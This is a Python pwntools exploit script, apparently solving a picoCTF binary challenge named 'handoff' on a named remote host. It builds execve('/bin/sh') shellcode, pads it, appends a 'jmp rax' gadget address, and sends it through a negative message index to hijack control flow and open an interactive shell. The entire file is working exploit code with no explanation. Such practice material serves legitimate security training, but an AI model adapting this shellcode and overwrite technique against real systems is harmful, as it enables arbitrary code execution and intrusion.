#!/usr/bin/env python3
from pwn import *

PORT =  56169
HOST = "shape-facility.picoctf.net"
exe = context.binary = ELF('./handoff', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x0000000000401267
            b*0x00000000004012f8
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

#GDB()

def add(data):
	p.sendlineafter(b"\n", str(1))
	p.sendlineafter(b"recipient's name: \n", data)

def send(idx, data):
	p.sendlineafter(b"\n", str(2))
	p.sendlineafter(b"send a message to?\n", str(idx))
	p.sendlineafter(b"send them?\n", data)

def exit(data):
    p.sendlineafter(b"\n", str(3))
    p.sendlineafter(b"appreciate it: \n", data)

sc = asm('''
    xor rax, rax
    mov rax, 29400045130965551
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch = 'amd64')

jmp_rax = 0x0040116c

pl = sc.ljust(40, b'\x00') + p64(jmp_rax)
send(-1, pl)

p.interactive()
